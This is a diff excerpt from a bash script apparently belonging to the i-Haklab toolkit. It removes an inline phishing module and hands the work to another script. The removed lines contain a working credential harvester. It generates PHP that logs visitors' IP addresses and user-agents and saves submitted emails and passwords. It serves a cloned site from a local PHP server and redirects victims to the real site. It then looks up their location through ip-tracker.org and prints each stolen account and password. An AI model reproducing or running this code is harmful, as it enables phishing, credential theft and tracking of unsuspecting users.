-		echo "      \$ipaddress = \$_SERVER['HTTP_X_FORWARDED_FOR'].\"\r\n\";" >> $TMP_PATH/ip.php
-		echo "    }" >> $TMP_PATH/ip.php
-		echo "else" >> $TMP_PATH/ip.php
-		echo "    {" >> $TMP_PATH/ip.php
-		echo "      \$ipaddress = \$_SERVER['REMOTE_ADDR'].\"\r\n\";" >> $TMP_PATH/ip.php
-		echo "    }" >> $TMP_PATH/ip.php
-		echo "\$useragent = \" User-Agent: \";" >> $TMP_PATH/ip.php
-		echo "\$browser = \$_SERVER['HTTP_USER_AGENT'];" >> $TMP_PATH/ip.php
-		echo " " >> $TMP_PATH/ip.php
-		echo " " >> $TMP_PATH/ip.php
-		echo "\$file = 'ip.txt';" >> $TMP_PATH/ip.php
-		echo "\$victim = \"IP: \";" >> $TMP_PATH/ip.php
-		echo "\$fp = fopen(\$file, 'a');" >> $TMP_PATH/ip.php
-		echo " " >> $TMP_PATH/ip.php
-		echo "fwrite(\$fp, \$victim);" >> $TMP_PATH/ip.php
-		echo "fwrite(\$fp, \$ipaddress);" >> $TMP_PATH/ip.php
-		echo "fwrite(\$fp, \$useragent);" >> $TMP_PATH/ip.php
-		echo "fwrite(\$fp, \$browser);" >> $TMP_PATH/ip.php
-		echo " " >> $TMP_PATH/ip.php
-		echo " " >> $TMP_PATH/ip.php
-		echo "fclose(\$fp);" >> $TMP_PATH/ip.php
-		#
-		echo "<?php" > $TMP_PATH/post.php
-		echo "header('Location: https://$3');" >> $TMP_PATH/post.php
-		echo "if (!empty(\$_POST['email'])) {file_put_contents(\"usernames.txt\", \"Account: \" . \$_POST['email'] . \" Pass: \" . \$_POST['pass'] . \"\n\", FILE_APPEND);" >> $TMP_PATH/post.php
-		echo "}" >> $TMP_PATH/post.php
-		echo "" >> $TMP_PATH/post.php
-		echo "exit();" >> $TMP_PATH/post.php
-		checkphp=$(ps aux | grep -o "php" | head -n1)
-		if [ $checkphp == *'php'* ]; then
-			pkill -f -2 php > /dev/null 2>&1
-			killall -2 php > /dev/null 2>&1
-		fi
-		exec serverphp $TMP_PATH > /dev/null 2>&1 &
-		printf "$G\n[+]->$W Site $2 cloned$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W Run i-Haklab forwarding to take it out of lan$B\n[-]->$W Waiting for information . . .\n"
-		if [ ! -e $TMP_PATH/creds.txt ]; then
-			touch $TMP_PATH/creds.txt
-		fi
-		while [ $TMP_PATH/ip.txt ] && [ $TMP_PATH/usernames.txt ]; do
-#		while [ true ]; do
-
-#			if [ -e $TMP_PATH/ip.txt ] && [ -e $TMP_PATH/usernames.txt ]; then
-				printf "$G[+]-> CREDENTIALS FOUND$W"
-				exec date >> $TMP_PATH/creds.txt
-IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
-IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
-				if [ ! -z $IP ]; then
-					echo $IP >> $TMP_PATH/creds.txt
-					printf "$G[+]-> IP:$W\t$IP"
-					sleep 0.5
-				fi
-IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-				if [ ! -z $IP_SPEED ]; then
-					echo $IP_SPEED >> $TMP_PATH/creds.txt
-					printf "$G[+]-> IP SPEED:$W\t$IP_SPEED"
-					sleep 0.5
-				fi
-IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-				if [ ! -z $IP_CURRENCY ]; then
-					echo $IP_CURRENCY >> $TMP_PATH/creds.txt
-					printf "$G[+]-> IP CURRENCY:$W\t$IP_CURRENCY"
-					sleep 0.5
-				fi
-CONTINENT=$(grep -o 'Continent.*' $TMP_PATH/iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
-				if [ ! -z $CONTINENT ]; then
-					echo $CONTINENT >> $TMP_PATH/creds.txt
-					printf "$G[+]-> CONTINENT:$W\t$CONTINENT"
-					sleep 0.5
-				fi
-COUNTRY=$(grep -o 'Country:.*' $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
-				if [ ! -z $COUNTRY ]; then
-					echo $COUNTRY >> $TMP_PATH/creds.txt
-					printf "$G[+]-> COUNTRY:$W\t$COUNTRY"
-					sleep 0.5
-				fi
-STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
-				if [ ! -z $STATE ]; then
-					echo $STATE >> $TMP_PATH/creds.txt
-					printf "$G[+]-> STATE:$W\t$STATE"
-					sleep 0.5
-				fi
-CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-				if [ ! -z $CITY ]; then
-					echo $CITY >> $TMP_PATH/creds.txt
-					printf "$G[+]-> CITY:$W\t$CITY"
-					sleep 0.5
-				fi
-HOSTIP=$(grep  -o "</td></tr><tr><th>Hostname:.*" $TMP_PATH/iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
-				if [ ! -z $HOSTIP ]; then
-					echo $HOSTIP >> $TMP_PATH/creds.txt
-					printf "$G[+]-> HOST IP:$W\t$HOSTIP"
-					sleep 0.5
-				fi
-REVERSE_DNS=$(grep -a "</td></tr><tr><th>Hostname:.*" $TMP_PATH/iptracker.log | cut -d "<" -f1)
-				if [ ! -z $REVERSE_DNS ]; then
-					echo $REVERSE_DNS >> $TMP_PATH/creds.txt
-					printf "$G[+]-> REVERSE DNS:$W\t$REVERS_DNS"
-					sleep 0.5
-				fi
-ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
-				if [ ! -z $ACCOUNT ]; then
-					echo $ACCOUNT >> $TMP_PATH/creds.txt
-					printf "$G[+]-> ACCOUNT:$W\t$ACCOUNT"
-					sleep 0.5
-				fi
-PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d ":" -f2)
-				if [ ! -z $PASSWD ]; then
-					echo $PASSWD >> $TMP_PATH/creds.txt
-					printf "$G[+]-> PASSWORD:$W\t$PASSWD"
-					sleep 0.5
-				fi
-UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
-				if [ ! -z $UA ]; then
-					echo $UA >> $TMP_PATH/creds.txt
-					printf "$G[+]-> USER AGENT:$W\t$UA"
-					sleep 0.5
-				fi
-ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-				if [ ! -z $ISP ]; then
-					echo $ISP >> $TMP_PATH/creds.txt
-					printf "$G[+]-> ISP:$W\t$ISP"
-					sleep 0.5
-				fi
-AS_NUMBER=$(grep -o "AS Number:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-				if [ ! -z $AS_NUMBER ]; then
-					echo $AS_NUMBER >> $TMP_PATH/creds.txt
-					printf "$G[+]-> AS NUMBER:$W\t$AS_NUMBER"
-					sleep 0.5
-				fi
-				printf "$G\n[+]->$W Credentials saved in $TMP_PATH/creds.txt"
-			#fi
-		done
-	else
-		printf "$R[w]->$W This website has not been included yet"
-	fi
+	bash $iHAKLAB/.set/share/phishing
 else
 	printf "$R[w]->$W Invalid argument $1 $R|$W Use help to main menu\n"
 fi
+
 #                                               @Ivam3
